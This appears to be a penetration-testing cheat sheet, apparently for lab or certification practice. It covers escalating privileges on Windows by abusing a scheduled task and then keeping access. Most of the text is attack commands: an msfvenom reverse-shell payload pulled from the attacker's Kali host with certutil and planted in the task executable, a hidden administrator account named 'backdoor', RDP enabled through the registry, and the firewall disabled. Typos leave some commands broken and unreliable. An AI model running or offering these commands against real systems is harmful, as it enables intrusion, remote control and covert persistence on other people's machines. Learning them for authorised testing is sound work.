######## Abusing of Scheduled Task to escalate privilges and Persistence via Backdooring ########
Credits: Derron C Attack Path2: https://www.youtube.com/watch?v=jBfdlLybMek

Once we have a first access on a machine, we can run winpeas or enumerate manually to list all the process, task, file that we can use to escalade

    Then if we find a vulnerability on Schedule Task:
        Windows cmd that list TaskName + Privileges:
        -> schtask /query /fo /LIST /v /TN "TaskName"

        We can create a reverse shell to abusing the schedule task and obtain privileges:
            in Kali:
                msfvenom -p windows/x64/shell_reverse_tecp LHOST=<Kali ip> LPORT=<Port> -f exe -o payloadName.exe

                Run a Local Web Server:
                    python -m http.server 8080

        Windows:
            certutil.exe -urlcache -f http:///Kali IP/payload.exe payload.exe

            encapsulate the payload into the task exe

            Once we have acces to a renote shell with Admin priv:
                search for local an proof.txt:
                    -> dir /s/b local.txt
                        or
                        dir /s/b *.txt
    
    Backdooring with admin priv:
        C:\Users>net user /add backdoor Password1     <--Create and add a User named Backdoor
                >net localgroup administrators /add backdoor 
                >net localgroup administrators        <- List our backdoor in Admin localgroup
                >net user backdoor                    <- verify again
        
        If not enable use this command to backdooring via RDP and Not - Deny by Denying Terminal Service to '0' :)
            C:\Users> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

        Disable the Win FW: 
            C:\Users> netsh advfirewall set allprofiles state off

        Kali RDP:
            xfreerdp /v:ms01 /u:backdoor /p:Password1 +clipboard /cert:ignore